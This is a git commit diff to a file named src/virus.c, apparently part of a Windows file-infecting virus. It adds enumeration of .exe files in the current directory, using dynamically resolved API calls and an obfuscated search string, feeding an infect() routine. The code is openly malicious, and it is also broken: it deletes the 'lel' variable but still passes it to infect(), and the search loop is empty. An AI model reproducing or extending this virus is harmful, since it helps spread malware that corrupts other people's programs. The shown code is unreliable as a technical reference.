394e9ed62852f66a2bfb1097bba9506ff342ec7c
Jakob Fischer <JakobFischer93@gmail.com>
2018-09-17 23:34:49 +0200

    Started file enumeration

--- src/virus.c
+++ src/virus.c
@@ -8,20 +8,21 @@ int run(void) {
          (void*)run < (void*)code_end);
   
   if (init_data(&data, (void*)code_begin, (void*)code_end, (uint8_t*)run - (uint8_t*)code_begin) != 0) {
-    return -1;
+    return 1;
   }
+  WIN32_FIND_DATAA findData;
+  HANDLE hFind;
+  const char searchPattern[8] = { '.', '/', '*', '.', 'e', 'x', 'e', 0 };
 
-  char lel[20];
-  lel[0] = 'P';
-  lel[1] = 'E';
-  lel[2] = 'v';
-  lel[3] = 'i';
-  lel[4] = 'e';
-  lel[5] = 'w';
-  lel[6] = '.';
-  lel[7] = 'e';
-  lel[8] = 'x';
-  lel[9] = 'e';
-  lel[10] = 0;
+  memzero(&findData, sizeof(WIN32_FIND_DATAA));
+  hFind = data.functions.findFirstFileA(searchPattern, &findData);
+  if (hFind == INVALID_HANDLE_VALUE) {
+    return 2;
+  }
+  do {
+
+  } while (data.functions.findNextFileA(hFind, &findData));
+  data.functions.findClose(hFind);
+
   return infect(lel, &data);
 }
